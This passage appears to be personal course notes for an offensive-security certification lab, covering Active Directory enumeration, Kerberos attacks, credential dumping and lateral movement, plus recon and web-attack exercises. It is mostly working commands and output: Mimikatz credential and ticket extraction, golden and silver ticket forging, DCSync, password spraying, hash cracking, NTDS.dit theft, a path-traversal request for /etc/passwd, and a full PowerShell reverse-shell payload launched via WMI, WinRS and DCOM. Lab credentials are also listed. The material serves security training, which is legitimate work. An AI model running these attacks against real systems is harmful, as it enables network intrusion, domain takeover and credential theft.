    `PS C:\Tools> Get-NetSession -ComputerName files04 -Verbose`  
  - Administrative privileges on CLIENT74 with stephanie > the IP address in CName (192.168.50.75) does not match the IP address for CLIENT74  
    `PS C:\Tools> Get-NetSession -ComputerName client74`  
  - Displaying permissions on the DefaultSecurity registry hive  
    ```
    PS C:\Tools> Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
    ...
    Access : BUILTIN\Users Allow  ReadKey  
    Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl   
    ```
  - Querying operating system and version   
    `PS C:\Tools> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion`  
    ...
    CLIENT76.corp.com Windows 10 Pro  10.0 (16299)
  - Using PsLoggedOn to see user logons at Files04 > Users logged on locally: CORP\jeff  
    `PS C:\Tools\PSTools> .\PsLoggedon.exe \\files04`  
    `PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04` //might be false positive  
    `PS C:\Tools\PSTools> .\PsLoggedon.exe \\client74` //admin privilege  
- Services Principals Names (SPN)
  - Listing SPN linked to a certain user account > Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:  
    `c:\Tools>setspn -L iis_service`  
  - Listing the SPN accounts in the domain > samaccountname serviceprincipalname  
    `PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname` //{HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}  
  - Resolving the web04.corp.com named > Address:  192.168.50.72  
    `PS C:\Tools\> nslookup.exe web04.corp.com`  
- Object Permissions (GenericAll - Full permission)
  - Running Get-ObjectAcl specifying our user > ObjectSID: S-1-5-21-1987370270-658905905-1781884369-1104; ActiveDirectoryRights: ReadProperty; SecurityIdentifier: S-1-5-21-1987370270-658905905-1781884369-553  
    `PS C:\Tools> Get-ObjectAcl -Identity stephanie`
  - use PowerView's Convert-SidToName command to convert it to an actual domain object name > CORP\stephanie  
    `PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`
  - Converting the SecurityIdentifier into name > CORP\RAS and IAS Servers  
    `PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553`
  - Enumerating ACLs for the Management Group  
    `PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
  - Converting all SIDs that have GenericAll permission on the Management Group > CORP\Domain Admins...  
    `PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName`
  - Using "net.exe" to add ourselves to domain group  
    `PS C:\Tools> net group "Management Department" stephanie /add /domain`
  - Running "Get-NetGroup" to enumerate "Management Department" (verify if stephanie now added to the group)  > {CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}  
    `PS C:\Tools> Get-NetGroup "Management Department" | select member`
  - Using "net.exe" to remove ourselves from domain group  
    `PS C:\Tools> net group "Management Department" stephanie /del /domain`
- Domain Shares
  - PowerView's Find-DomainShare > name, type, remark, computerName  
    `PS C:\Tools> Find-DomainShare`  //DC1.corp.com，web04.corp.com，client74.corp.com
  - Listing contents of the SYSVOL share (%SystemRoot%\SYSVOL\Sysvol\domain-name) > policies, scripts  
    `PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\`
  - Listing contents of the "SYSVOL\policies share" > oldpolicy  
    `PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Policies`
  - Checking contents of old-policy-backup.xml file > cpassword="+bsY0..."  
    `PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml`  
  - Using gpp-decrypt to decrypt the password > P@$$w0rd  
    `kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"`
  - Listing the contents of docsare > docs  
    `PS C:\Tools> ls \\FILES04\docshare`
  - Listing the contents of do-not-share > start-email.txt  
    `PS C:\Tools> ls \\FILES04\docshare\docs\do-not-share`
  - Checking the "start-email.txt" file > password as well: HenchmanPutridBonbon11  
    `PS C:\Tools> cat \\FILES04\docshare\docs\do-not-share\start-email.txt`

**Automated enumeration**  
- Collecting data with SharpHound
  - Import Sharphound script  
    ```
    PS C:\Users\stephanie> powershell -ep bypass
    PS C:\Users\stephanie> Import-Module .\Sharphound.ps1
    PS C:\Users\stephanie\Downloads> Get-Help Invoke-BloodHound
    ```
  - Collect domain data > audit_20240810201601_BloodHound.zip  
    `PS C:\Users\stephanie\Downloads> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"`
  - Starting the Neo4j service in Kali Linux
    ```
    sudo apt update
    sudo apt install neo4j -y
    sudo neo4j start
    ...
    web interface at http://localhost:7474 //credential: neo4j  > neo4j1 (change password)
    ```  
 
- Analysing data using BloodHound
  - Install and Starting BloodHound in Kali Linux  
    https://blog.spookysec.net/Deploying-BHCE/ (admin:LxZQwhnHcY7RiPDfjX5pasciuYHHEZdb)
    ```
    apt install docker-compose
    wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz && tar -xzf ./bloodhound-cli-linux-amd64.tar.gz && rm bloodhound-cli-linux-amd64.tar.gz
    Login: admin; Admin12345678!

    sudo ./bloodhound-cli install
    
    --troubleshooting
    sudo lsof -i :7687 //confirm port is free
    sudo neo4j stop       # if installed as service
    sudo pkill -f neo4j   # if running in console mode
    ```
  - Upload data "corp audit_xxxx_BloodHound.zip" in Bloodhound UI  
  - stephanie@corp.com  AdminTo Client74.corp.com > Mark User as Owned  
  - jeffadmin@corp.com  
  - run the Shortest Paths to Domain Admins from Owned Principals  
  - stephanie user should be able to connect to CLIENT74, where jeffadmin has a session. jeffadmin is a part of the Domain Admins  
  
### 23. Attacking active drectiory authentication
- NTLM authentication
  - client authenticates to a server by IP address instead of by hostname OR user authenticate to a hostname not registered on the Active Directory-integrated DNS server
- Kerberos authentication
  - NTLM (challenge-and-response) vs Kerberos (ticket system)
  - User login → The workstation sends a **Kerberos AS-REQ** to the Key Distribution Center (KDC) on the domain controller.
  - KDC verification → If credentials are correct, the KDC replies with an **AS-REP** containing a Ticket Granting Ticket (TGT).
  - The TGT can then be used to request service tickets **(TGS-REQ/TGS-REP)** for accessing resources.
- Cached AD credentials
  - hashes are stored in the Local Security Authority Subsystem Service (LSASS)
  - Connecting to CLIENT75 via RDP  
    `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75 /cert:ignore /drive:share,/home/kali/share`  
  - Starting Mimikatz (admin) and enabling SeDebugPrivilege  
    ```
    PS C:\Windows\system32> cd C:\Tools
    PS C:\Tools\> .\mimikatz.exe
    mimikatz # privilege::debug
    ```
  - Dump credentials > NTLM, SHA1 (user jeff, dave)  
    `mimikatz # sekurlsa::logonpasswords`
  - open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path \\web04.corp.com\backup  
    `PS C:\Users\jeff> dir \\web04.corp.com\backup`  //backup_schemata.txt
  - Extracting Kerberos tickets with mimikatz > Ticket Granting Service, Ticket Granting Ticket  
    `mimikatz # sekurlsa::tickets`
- Password attacks
  - review policy of user jeff > Lockout threshold, Lockout duration  
    `PS C:\Users\jeff> net accounts`
  - Authenticating using DirectoryEntry
    ```
    PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
    ```
  - **Spray-Passwords** to attack user accounts > **Users guessed are**
    ```
    PS C:\Users\jeff> cd C:\Tools
    PS C:\Tools> powershell -ep bypass
    PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
    ```
  - **crackmapexec** to attack user accounts > [+] corp.com\jen:Nexus123!
    ```
    kali@kali:~$ cat users.txt
    dave
    jen
    pete

    kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
    ```
  - Crackmapexec output indicating that the valid credentials have administrative privileges on the target > (Pwn3d!)
    ```
    kali@kali:~$ crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com  
    ```
  - **kerbrute** to attack user accountsm > **[+] VALID LOGIN**
    ```
    PS C:\Tools> notepad usernames.txt
    dave
    jen
    pete

    PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
    ```
- AS-REP roasting
  - Find Vulnerable Users Does not require Kerberos preauthentication > dave  
    `kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete`
  - Obtain correct mode for hashcat >  18200 | Kerberos 5, etype 23, AS-REP  
    `kali@kali:~$ hashcat --help | grep -i "Kerberos"`
  - Cracking the AS-REP hash with **Hashcat** > Flowers1  
    `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
  - Using **Rubeus** to obtain the AS-REP hash of dave  
    `PS C:\Tools> .\Rubeus.exe asreproast /nowrap`  copy the output to hashes.asreproast2  
    `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
- Kerberoasting > SamAccountName, Hash written to C:\Tools\hashes.kerberoast
  - Decrypt the service ticket (SPN's password hash)
  - Utilizing **Rubeus** to perform a Kerberoast attack  
    `PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast`  
  - copy hashes.kerberoast to our Kali machine  
  - Reviewing the correct Hashcat mode  >  13100 | Kerberos 5, etype 23, TGS-REP   
    `kali@kali:~$ hashcat --help | grep -i "Kerberos"`
  - Cracking the TGS-REP hash > Strawberry1  
    `kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
  - Using **impacket-GetUserSPNs** to perform Kerberoasting on Linux > successfully obtained the TGS-REP hash  
    `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`
  - Note: If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
  - store the TGS-REP hash in a file named hashes.kerberoast2 and crack it with Hashcat  
    `sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
- Silver tickets
  - Need 3 info to creat silver ticket: SPN password hash, domain SID, target SPN  
  - Trying to access the web page on WEB04 as user jeff  
    `PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04`  //unauthorized
  - Use mimikatz to obtain NTLM hash of user account "iis_service" which mapped to the target SPN > NTLM 4d28cf5252d39971419580a51484ca09  
    ```
    mimikatz # privilege::debug
    mimikatz # sekurlsa::logonpasswords
    ```  
  - Obtain domain SID > SID S-1-5-21-1987370270-658905905-1781884369-1105  
    `PS C:\Users\jeff> whoami /user`
  - target the HTTP SPN resource on WEB04  
  - Forging the service ticket with the user jeffadmin > Golden ticket for 'jeffadmin @ corp.com' successfully submitted  
    `mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`
  - Listing Kerberos tickets to confirm the silver ticket is submitted to the current session  (Admin powershell)
    `PS C:\Tools> klist`
  - Accessing the SMB share with the silver ticket  
    `PS C:\Tools> iwr -UseDefaultCredentials http://web04`
- Domain controller synchronization
  - A DCSync attack is a technique where an attacker uses replication permissions in Active Directory to impersonate a Domain Controller and request user credentials (NTLM hashes, Kerberos keys, etc.) from another DC
  - By default, Domain Admins, Enterprise Admins, and the KRBTGT account can replicate directory changes.
  - Use tools like BloodHound to identify accounts with Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes In Filtered Set  
  - Using **Mimikatz** to perform a dcsync attack to obtain the credentials of dave > **credentials**: Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494  
    ```
    PS C:\Users\jeffadmin> cd C:\Tools\
    PS C:\Tools> .\mimikatz.exe
    mimikatz # lsadump::dcsync /user:corp\dave
    ```
  - Crack the NTLM hash > Flowers1  
    `kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
  - Using **secretsdump** to perform the dcsync attack to obtain the NTLM hash of dave > 08d7a47a6f9f66b97b1bae4178747494  
    ```
    kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
    ...
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
    ```
    
### 24. Lateral movement in active directory  
- WMI and WinRM
  - **WMI need a member of local admin group**  
  - communicate over RPC port 135  
  - use **wmic** utility to spawn a process on a remote system > ProcessId = 5772 (win32calc.exe process appear with jen)  
    `C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"`
  - create PSCredential object in PowerShell  
    ```
    $username = 'jen';
    $password = 'Nexus123!';
    $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
    $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
    ```
  - create a new CimSession  
    ```
    $options = New-CimSessionOption -Protocol DCOM
    $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
    $command = 'calc';
    ```
  - invoke WMI session through PowerShell  
    ```
    PS C:\Users\jeff> $username = 'jen';
    ...
    PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
    ```
  - Verifying the active processes on the targt machine (task manager)  
  - Executing the WMI PowerShell payload  
    ```
    import sys
    import base64

    payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

    cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

    print(cmd)
    ```
  -  Running the base64 encoder Python script  
     `kali@kali:~$ python3 encode.py`
  -  Move to client74 machine and run the PowerShell WMI script with the newly generated encoded reverse shell payload  
     ```
     PS C:\Users\jeff> $username = 'jen';
     PS C:\Users\jeff> $password = 'Nexus123!';
     PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
     PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

     PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
     PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

     PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
     HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

     PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
     ```
  -  switch to kali listener  
     ```
     kali@kali:~$ nc -lnvp 443
     connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 49855

     PS C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd64> hostname
     FILES04
     ```
  -  Executing commands remotely via WinRS    
     `C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"`
  -  Running the reverse-shell payload through WinRS  
     `C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
  - Establishing a PowerShell Remote Session via WinRM  
    ```
    PS C:\Users\jeff> $username = 'jen';
    PS C:\Users\jeff> $password = 'Nexus123!';
    PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
    PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
    PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
    ```
  - To interact with the session  
    `PS C:\Users\jeff> Enter-PSSession 1`
- PsExec
  - 3 requisite:  member of admin local group; ADMIN$ share; File and Printer Sharing  
  - Need to transfer PsExec too compromised machine (SysInternals suite)  
  - Login to client74 as 'offsec' user  
  - obtain an interactive shell on the target system with PsExec  
    ```
    PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
    C:\Windows\system32>hostname
    C:\Windows\system32>whoami
    ```
- Pass the Hash
  - 3 prerequisites: SMB port 445, Windows File, Printer Sharing, ADMIN$  
  - Passing the hash using Impacket wmiexec (local administrator account on FILES04)  
    `kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73`
- Overpass the Hash
  - goal: turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication
  - Log in to the Windows 10 **CLIENT76** as 'jeff' and run a process as jen:Nexus123!
  - Run notepad as different user 'jen'
  - Dumping password hash for 'jen' > 369def79d8372408bf6e93364cc93075  
    `C:\tools>.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > samdump.txt`
  - Creating a process with a different user's NTLM password hash  
    `mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell`  
    Running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen  
  - Listing Kerberos tickets  
    `PS C:\Windows\system32> klist`  
    No Kerberos tickets have been cached, but this is expected since jen has not yet performed an interactive login
  - Mapping a network share on a remote server  
    `PS C:\Windows\system32> net use \\files04`  
  - Listing Kerberos tickets  
    `PS C:\Windows\system32> klist`
    Server: krbtgt/CORP.COM @ CORP.COM
    Server: cifs/files04 @ CORP.COM  
  - We have now converted our NTLM hash into a Kerberos TGT  
  - Opening remote connection using Kerberos  
    `PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd`  
    C:\Windows\system32>hostname    //successfully reused the Kerberos TGT to launch a command shell on the files04 server  
- Pass the Ticket
  - log in as jen to CLIENT76 and unable to access the resource on Web04 (but Dave do)  
    ```
    PS C:\Windows\system32> ls \\web04\backup
    ls : Access to the path '\\web04\backup' is denied.
    ```
  - Exporting Kerberos TGT/TGS to disk  
    ```
    mimikatz #privilege::debug
    mimikatz #sekurlsa::tickets /export
    ```
  - verify newly generated tickets with dir, filtering out on the kirbi extension >  [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi  
    `PS C:\Tools> dir *.kirbi`
  - just pick any TGS ticket in the dave@cifs-web04.kirbi format  
    `mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
  - Inspecting the injected ticket in memory > Server: cifs/web04 @ CORP.COM  
    `PS C:\Tools> klist`
  - Accessing the shared folder through the injected ticket  
    `PS C:\Tools> ls \\web04\backup`  
- DCOM
  - Loggined in to client74 as 'jen', From an elevated PowerShell prompt  
  - Remotely Instantiating the MMC Application object (target IP of FILES04)  
    `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))`  
  - Executing a command on the remote DCOM object  
    `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`
  - Verifying that calculator is running on FILES04  
    `C:\Users\Administrator>tasklist | findstr "calc"`  
  - Adding a reverse-shell as a DCOM payload on CLIENT74  
    `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
  - Obtaining a reverse-shell through DCOM lateral movement (FILES04)  
    `kali@kali:~$ nc -lnvp 443`
- Golden Ticket
  - Dump krbtgt hash → 2. Forge TGT for any user → 3. Inject ticket → 4. Access resources → 5. Maintain persistent domain-admin-level access  
  - krbtgt:  password hash of a domain user account
  - golden ticket: if we got krbtgt password hash, can create own self-made custom TGTs
  - move from the Windows 11 CLIENT74 workstation to the domain controller via PsExec (failed because of permission)
    `C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe`
  - need a compromised domain controller then can extract hash of the krbtgt account with Mimikatz.
  - **Log in to the domain controller with remote desktop using the jeffadmin** account > CORP / S-1-5-21-1987370270-658905905-1781884369; user: krbtgt, NTLM 1693c6cefafffc7af11ef34d1c788f47  
    ```
    mimikatz # privilege::debug
    mimikatz # lsadump::lsa /patch
    ```
  - **move back to CLIENT74 as the jen user**
  - Purging existing Kerberos Tickets
    `mimikatz # kerberos::purge`
  - Creating a golden ticket using Mimikatz > User Id : 500  
    ```
    mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
    ...
    Golden ticket for 'jen @ corp.com' successfully submitted for current session
    
    mimikatz # misc::cmd
    ```
  - launch a new command prompt with misc::cmd to access DC01  
    `C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe`  
    `C:\Windows\system32>ipconfig`
  - verify jen is now part of the Domain Admin group > CORP\Domain Admins  
    `C:\Windows\system32>whoami /groups`
  - FYI: Use of NTLM authentication blocks our access  
    `C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe` //Access is denied.  
- Shadow Copies
  - A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes. Allow us to extract the Active Directory Database NTDS.dit database file.  
  - connect as the **jeffadmin** domain admin user to the **DC1** domain controller.  
  - Performing a Shadow Copy of the entire C: drive > Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2  
    `C:\Tools>vshadow.exe -nw -p  C:`
  - Copying the ntds database to the C: drive  
    `C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`  
  - Copying the ntds database to the C: drive  
    `C:\>reg.exe save hklm\system c:\system.bak`  
  - Moved 2 .bak files to kali machine  
  - Use secretsdump to extract credentials  
    `kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`  
    impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL  
  - we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method  

### 25. Enumerating AWS Cloud Infrastruture
### 26. Attacking AWS cloud infrastruture 
### 27. Assembling the pieces

## PWK-200 labs
### Information gathering
- 6.2.1 Whois Enumeration  
  `whois megacorpone.com -h 192.168.50.251`
- 6.2.2 Google Hacking  
  `site:megacorpone.com intext:"VP of Legal"`  
  `site:linkedin.com/in "MegaCorp One"`    
  Google: rocketreach.co "MegaCorp One"
- 6.2.3 Netcraft  
  `https://sitereport.netcraft.com/?url=http://www.megacorpone.com` (View the report under section Network & site technology)
- 6.2.4 Open-Source Code  
  `./gitleaks dir /home/kali/offsec/megacorpone.com/megacorpone -v` (No leaks)  
  `nano config/gitleaks.toml`  
  ```
  [[rules]]
  id = "apache-htpasswd-md5"
  description = "Detect Apache htpasswd MD5 hash (APR1)"
  regex = '''(?i)\b[a-z0-9._%-]+:\$apr1\$[A-Za-z0-9./$]{8,}'''
  keywords = ["$apr1$"]
  tags = ["password", "apache", "htpasswd"]
  ```
  `./gitleaks dir /home/kali/offsec/megacorpone.com/megacorpone -v -c=config/gitleaks.toml` (Leaks found on home/kali/offsec/megacorpone.com/megacorpone/xampp.users)  
- 6.4.1 DNS enumeration
  - Perform a DNS enumeration on the MX records of megacorpone.com (lower priroty valid higher preference)  
    `host -t mx megacorpone.com`  
  - How many TXT records are associated with the megacorpone.com domain  
    `host -t txt megacorpone.com`  
  -  IP of the siem.megacorpone.com  
     `dnsenum siem.megacorpone.com`  
  -  RDP to win11 + enumerate megacorptwo.com and its subdomains through nslookup. TXT record of the info.megacorptwo.com domain
     ```
     xfreerdp3 /u:student /p:lab /v:192.168.165.152
     nslookup megacorptwo.com 
     nslookup -type=TXT info.megacorptwo.com 192.168.165.151
     ```
- 6.4.2 TCP/UDP Port scanning
  - Netcat scan for port 1-1000 (show open port only)  
    `nc -nvv -w 1 -z 192.168.165.151 1-1000 2>&1 | grep open`
  - Netcat TCP port scan 1-10000 (show open port only)  
    `nc -nvv -w 1 -z 192.168.165.151 1-10000 2>&1 | grep open`
  - Netcat UDP port scan  
    `nc -nv -u -z -w 1 192.168.165.151 150-200 2>&1 | grep open`
- 6.4.3 Port scanning with Nmap
  - SYN scan for /24 subnet + port 25 open  
    `sudo nmap -sS -p 25 192.168.165.0/24 --open`  
  - SYN scan for /24 subnet + port WHOIS open  
    `sudo nmap -sT -p 43 192.168.165.0/24 --open`  
  - RDP to win11 + TCP port discovery against windows DC, first 4 open TCP ports  
    `xfreerdp3 /u:student /p:lab /v:192.168.165.152`  
    `PS: 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.165.151", $_)) "TCP port $_ is open"} 2>$null`  
  - TCP port scan 50000-60000 to identify the highest TCP port  
    `sudo nmap -sT -p 50000-60000 192.168.165.52 --open`  
    `nc 192.168.165.52 59811`  
  - NSE website title and read the flag in index.html  
    `sudo nmap -p 80,8080 --script=http-title 192.168.165.0/24`  
    `curl http://192.168.165.6/index.html`  
- 6.4.4 SMB enumeration
  - nmap SMB (port 139, 445)  
    `nmap -v -p 445 --open -oG smb.txt 192.168.165.0/24`
  - RDP Win11 + shares enumeration against dc01 via net view  
    `net view \\dc01 /all`  
  - enum4linux for local users alfred
    ```
    sudo nmap -p 139,445 --open -oG smb_hosts.txt 192.168.165.0/24
    grep "/open/" smb_hosts.txt | awk '{print $2}' > smb_targets.txt
    enum4linux -a 192.168.165.13
    ```
- 6.4.5 SMTP enumeration
  - search open SMTP, netcat on port 25, VRFY user 'root' and get the response code
    ```
    nmap -sT -p 25 --open 192.168.165.0/24  
    nc 192.168.165.8 25
    VRFY root
    ```
- 6.4.6 SNMP enumeration
  - use onesixtyone to identify SNMP servers. List the all the running process.
    ```
    echo public > community
    echo private >> community
    echo manager >> community
    for ip in $(seq 1 254); do echo 192.168.165.$ip; done > ips
    onesixtyone -c community -i ips
    snmpwalk -c public -v1 192.168.165.151 1.3.6.1.2.1.25.4.2.1.2
    ```
  - enumerate interface descriptions with ASCII decoding (hex to ASCII)  
    `snmpwalk -c public -v1 -t 10 -Oa 192.168.165.151`

### Vulnerability Scanning  
- 7.3.1 NSE vulnerability script  
  `sudo nmap -sV -p 443 --script "vuln" 192.168.173.13`
- 7.3.2 working with NSE script  
  **Capstone Labs:** Follow the steps above to perform the vulnerability scan with the custom NSE script on VM #1.  
  
  [Apache HTTP Server 2.4.49 - Path Traversal (CVE-2021-41773)](https://www.exploit-db.com/exploits/50383)  
  `sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse`  
  `sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.173.13`  
  `curl -s --path-as-is http://192.168.173.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`  

### Introduction to Web Application Attacks  
- 8.2 web application assessment 
  - directory brute force with GoBuster
    `gobuster dir -u 192.168.173.16 -w /usr/share/wordlists/dirb/common.txt -t5 -b 301`: exclude bad status code 301 redirection to continue
    `gobuster dir -u 192.168.173.52 -w /usr/share/wordlists/dirb/common.txt -t5`  
  - Security Testing with Burp Suite
    `curl http://192.168.173.52/passwords.txt`: download password  
     burp intruder on POST /login.php + position (password=admin)
- 8.3 Web application enumeration
  - debug page content
    `sudo nano etc/hosts`
    192.168.173.16  offsecwp
